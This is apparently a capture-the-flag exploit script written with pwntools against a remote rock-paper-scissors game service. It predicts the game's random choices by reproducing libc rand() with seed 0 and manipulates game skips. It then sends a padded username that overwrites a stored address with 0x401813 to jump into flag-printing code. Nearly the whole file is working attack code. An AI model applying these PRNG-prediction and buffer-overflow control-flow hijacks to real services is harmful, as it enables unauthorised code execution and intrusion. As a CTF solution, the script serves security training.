from pwn import *

target = remote('cop.ichsa.ctf.today', 8011)

#target = process('./game')

#conts = '\nc' * 15
#pid = gdb.attach(target, "\nb *play_next_round+405" + conts + "\n set disassembly-flavor intel\ncontinue")

from ctypes import CDLL
from math import *

#I used this one on a Kali machine.
libc = CDLL('libc-2.31.so')
#This one will work on an Ubuntu 18.04
#libc = ELF('libc.so.6')

libc.srand(0)

correct_array = []

for i in range(170):
	rand_num = libc.rand()
	correct_num = rand_num % 3 + 1
	correct_array.append(correct_num)
def play_round(selected_num):
	print(target.recvuntil(b'Please chose an option ['))
	target.sendline(b'2')
	print(target.recvuntil(b'Please chose an option ['))
	target.sendline(selected_num)

#This will give me enough points to do anything.
for i in range(15):
	comp_choice = correct_array[i]
	if comp_choice == 1:
		play_round(str(2).encode('ascii'))
	elif comp_choice == 2:
		play_round(str(3).encode('ascii'))
	else:
		play_round(str(1).encode('ascii'))

for i in range(249):
	print(target.recvuntil(b'Please chose an option ['))
	target.sendline(b'3')
	
	print(target.recvuntil(b'Please chose the number of games to skip ['))

	target.sendline(b'255')

print(target.recvuntil(b'Please chose an option ['))
target.sendline(b'3')
print(target.recvuntil(b'Please chose the number of games to skip ['))
target.sendline(b'150')

print(target.recvuntil(b'Please chose an option ['))
target.sendline(b'4')

print(target.recvuntil(b'Please chose an option ['))
target.sendline(b'5')
print(target.recvuntil(b'Enter your new username'))
#I established this level of padding with gdb and cyclic.
padding = b'a' * (30 - 16)

name = padding
name += p64(100) #Play number, doesn't really matter
name += p64(0x0000000000401813) #The address part-way through flag
name += p64(2) #The computer's selected handsignal, doesn't really matter.
target.sendline(name)

play_round(b'3')

target.interactive()
